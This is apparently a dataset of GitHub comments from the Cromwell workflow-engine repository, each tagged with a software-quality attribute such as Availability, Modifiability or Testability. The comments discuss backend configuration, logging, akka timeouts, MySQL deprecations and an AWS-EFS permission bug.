working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:987,Deployability,update,updated,987,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:51,Integrability,message,message,51,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:233,Modifiability,config,configuration,233,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:329,Modifiability,Config,Configuring,329,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:652,Modifiability,config,config,652,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:687,Modifiability,config,configuration,687,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:763,Modifiability,config,config,763,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:211,Performance,concurren,concurrent-job-limit,211,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/pull/6362#issuecomment-858886470:119,Testability,test,tests,119,"Thanks for the reviews. Gonna push a commit fixing the changelog since 64's not going out today, then will merge after tests pass.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6362#issuecomment-858886470
https://github.com/broadinstitute/cromwell/pull/6363#issuecomment-860684404:55,Integrability,message,message,55,"@aednichols @cjllanwarne, I had looked into adding log message inside `withRetryForTransactionRollback` method before. But I was not able to find a logger class that can be used. But I can take a look at it again. Agreed that having some kind of indication that retrying is happening will be good.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6363#issuecomment-860684404
https://github.com/broadinstitute/cromwell/pull/6363#issuecomment-860684404:51,Testability,log,log,51,"@aednichols @cjllanwarne, I had looked into adding log message inside `withRetryForTransactionRollback` method before. But I was not able to find a logger class that can be used. But I can take a look at it again. Agreed that having some kind of indication that retrying is happening will be good.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6363#issuecomment-860684404
https://github.com/broadinstitute/cromwell/pull/6363#issuecomment-860684404:148,Testability,log,logger,148,"@aednichols @cjllanwarne, I had looked into adding log message inside `withRetryForTransactionRollback` method before. But I was not able to find a logger class that can be used. But I can take a look at it again. Agreed that having some kind of indication that retrying is happening will be good.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6363#issuecomment-860684404
https://github.com/broadinstitute/cromwell/pull/6370#issuecomment-864365814:8,Availability,error,error,8,Example error output here: https://travis-ci.com/github/broadinstitute/cromwell/jobs/516477139,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6370#issuecomment-864365814
https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959:10,Availability,redundant,redundant,10,"Ignore my redundant self-approval of this PR. I intended to click ""merge"" but apparently the green ""Approve"" button was too tempting for me not to click on first",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959
https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959:93,Energy Efficiency,green,green,93,"Ignore my redundant self-approval of this PR. I intended to click ""merge"" but apparently the green ""Approve"" button was too tempting for me not to click on first",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959
https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959:10,Safety,redund,redundant,10,"Ignore my redundant self-approval of this PR. I intended to click ""merge"" but apparently the green ""Approve"" button was too tempting for me not to click on first",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959
https://github.com/broadinstitute/cromwell/pull/6378#issuecomment-865376322:0,Testability,TEST,TEST,0,TEST successful. Closing this PR,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6378#issuecomment-865376322
https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010:93,Availability,avail,available,93,"@KevinDuringWork, I guess thanks to you for making N2D, one of the best CPU families on GCP, available on Terra. T2D (AMD Milan) now offers the best price-to-performance ratio. I'm still new to software development. Could you add support to T2D or guide me on how I can accomplish this? thank you very much!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010
https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010:158,Performance,perform,performance,158,"@KevinDuringWork, I guess thanks to you for making N2D, one of the best CPU families on GCP, available on Terra. T2D (AMD Milan) now offers the best price-to-performance ratio. I'm still new to software development. Could you add support to T2D or guide me on how I can accomplish this? thank you very much!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010
https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010:248,Usability,guid,guide,248,"@KevinDuringWork, I guess thanks to you for making N2D, one of the best CPU families on GCP, available on Terra. T2D (AMD Milan) now offers the best price-to-performance ratio. I'm still new to software development. Could you add support to T2D or guide me on how I can accomplish this? thank you very much!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010
https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224:64,Safety,timeout,timeout,64,FYI- This PR creates a new (and used) `akka.http.logger-startup-timeout`. You probaby want to override `akka.logger-startup-timeout` [specified here](https://github.com/akka/akka/blob/v2.5.31/akka-actor/src/main/resources/reference.conf#L31-L34). Stanza issues also explains why the `ReferenceConfSpec` during `9e20c40` didn't catch a collision. That commit tried-to-override-but-created `akka.actor.default-dispatcher.fork-join-executor.logger-startup-timeout`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224
https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224:124,Safety,timeout,timeout,124,FYI- This PR creates a new (and used) `akka.http.logger-startup-timeout`. You probaby want to override `akka.logger-startup-timeout` [specified here](https://github.com/akka/akka/blob/v2.5.31/akka-actor/src/main/resources/reference.conf#L31-L34). Stanza issues also explains why the `ReferenceConfSpec` during `9e20c40` didn't catch a collision. That commit tried-to-override-but-created `akka.actor.default-dispatcher.fork-join-executor.logger-startup-timeout`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224
https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224:453,Safety,timeout,timeout,453,FYI- This PR creates a new (and used) `akka.http.logger-startup-timeout`. You probaby want to override `akka.logger-startup-timeout` [specified here](https://github.com/akka/akka/blob/v2.5.31/akka-actor/src/main/resources/reference.conf#L31-L34). Stanza issues also explains why the `ReferenceConfSpec` during `9e20c40` didn't catch a collision. That commit tried-to-override-but-created `akka.actor.default-dispatcher.fork-join-executor.logger-startup-timeout`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224
https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224:49,Testability,log,logger-startup-timeout,49,FYI- This PR creates a new (and used) `akka.http.logger-startup-timeout`. You probaby want to override `akka.logger-startup-timeout` [specified here](https://github.com/akka/akka/blob/v2.5.31/akka-actor/src/main/resources/reference.conf#L31-L34). Stanza issues also explains why the `ReferenceConfSpec` during `9e20c40` didn't catch a collision. That commit tried-to-override-but-created `akka.actor.default-dispatcher.fork-join-executor.logger-startup-timeout`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224
https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224:109,Testability,log,logger-startup-timeout,109,FYI- This PR creates a new (and used) `akka.http.logger-startup-timeout`. You probaby want to override `akka.logger-startup-timeout` [specified here](https://github.com/akka/akka/blob/v2.5.31/akka-actor/src/main/resources/reference.conf#L31-L34). Stanza issues also explains why the `ReferenceConfSpec` during `9e20c40` didn't catch a collision. That commit tried-to-override-but-created `akka.actor.default-dispatcher.fork-join-executor.logger-startup-timeout`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224
https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224:438,Testability,log,logger-startup-timeout,438,FYI- This PR creates a new (and used) `akka.http.logger-startup-timeout`. You probaby want to override `akka.logger-startup-timeout` [specified here](https://github.com/akka/akka/blob/v2.5.31/akka-actor/src/main/resources/reference.conf#L31-L34). Stanza issues also explains why the `ReferenceConfSpec` during `9e20c40` didn't catch a collision. That commit tried-to-override-but-created `akka.actor.default-dispatcher.fork-join-executor.logger-startup-timeout`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224
https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153:330,Availability,avail,available,330,"Incidental finding, no immediate action required:. > The Performance Schema tables are intended to replace the INFORMATION_SCHEMA tables, which are deprecated as of MySQL 5.7.6 and are removed in MySQL 8.0. . https://dev.mysql.com/doc/refman/5.7/en/upgrading-from-previous-series.html. It looks like the new performance schema is available on 5.6 but is not enabled on our prod config (requires flag)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153
https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153:378,Modifiability,config,config,378,"Incidental finding, no immediate action required:. > The Performance Schema tables are intended to replace the INFORMATION_SCHEMA tables, which are deprecated as of MySQL 5.7.6 and are removed in MySQL 8.0. . https://dev.mysql.com/doc/refman/5.7/en/upgrading-from-previous-series.html. It looks like the new performance schema is available on 5.6 but is not enabled on our prod config (requires flag)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153
https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153:57,Performance,Perform,Performance,57,"Incidental finding, no immediate action required:. > The Performance Schema tables are intended to replace the INFORMATION_SCHEMA tables, which are deprecated as of MySQL 5.7.6 and are removed in MySQL 8.0. . https://dev.mysql.com/doc/refman/5.7/en/upgrading-from-previous-series.html. It looks like the new performance schema is available on 5.6 but is not enabled on our prod config (requires flag)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153
https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153:308,Performance,perform,performance,308,"Incidental finding, no immediate action required:. > The Performance Schema tables are intended to replace the INFORMATION_SCHEMA tables, which are deprecated as of MySQL 5.7.6 and are removed in MySQL 8.0. . https://dev.mysql.com/doc/refman/5.7/en/upgrading-from-previous-series.html. It looks like the new performance schema is available on 5.6 but is not enabled on our prod config (requires flag)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153
https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254:0,Deployability,Update,Update,0,"Update: To avoid having all Cromwell instances send same data points to Grafana, now the config is an `Option[A]`. This way we can set it for the summarizer instance (PR [#2592](https://github.com/broadinstitute/firecloud-develop/pull/2592)) and have only 1 instance send data points. Testing from Dev:. ![Screen Shot 2021-07-06 at 2 10 25 PM](https://user-images.githubusercontent.com/16748522/124667085-edb05780-de7c-11eb-8dbd-888b13d702f7.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254
https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254:89,Modifiability,config,config,89,"Update: To avoid having all Cromwell instances send same data points to Grafana, now the config is an `Option[A]`. This way we can set it for the summarizer instance (PR [#2592](https://github.com/broadinstitute/firecloud-develop/pull/2592)) and have only 1 instance send data points. Testing from Dev:. ![Screen Shot 2021-07-06 at 2 10 25 PM](https://user-images.githubusercontent.com/16748522/124667085-edb05780-de7c-11eb-8dbd-888b13d702f7.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254
https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254:11,Safety,avoid,avoid,11,"Update: To avoid having all Cromwell instances send same data points to Grafana, now the config is an `Option[A]`. This way we can set it for the summarizer instance (PR [#2592](https://github.com/broadinstitute/firecloud-develop/pull/2592)) and have only 1 instance send data points. Testing from Dev:. ![Screen Shot 2021-07-06 at 2 10 25 PM](https://user-images.githubusercontent.com/16748522/124667085-edb05780-de7c-11eb-8dbd-888b13d702f7.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254
https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254:285,Testability,Test,Testing,285,"Update: To avoid having all Cromwell instances send same data points to Grafana, now the config is an `Option[A]`. This way we can set it for the summarizer instance (PR [#2592](https://github.com/broadinstitute/firecloud-develop/pull/2592)) and have only 1 instance send data points. Testing from Dev:. ![Screen Shot 2021-07-06 at 2 10 25 PM](https://user-images.githubusercontent.com/16748522/124667085-edb05780-de7c-11eb-8dbd-888b13d702f7.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254
https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:707,Availability,error,error,707,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:461,Deployability,upgrade,upgrades,461,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:768,Deployability,upgrade,upgrade,768,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:450,Integrability,depend,dependency,450,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:757,Integrability,depend,dependency,757,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:20,Safety,safe,safe,20,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:159,Testability,test,test,159,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
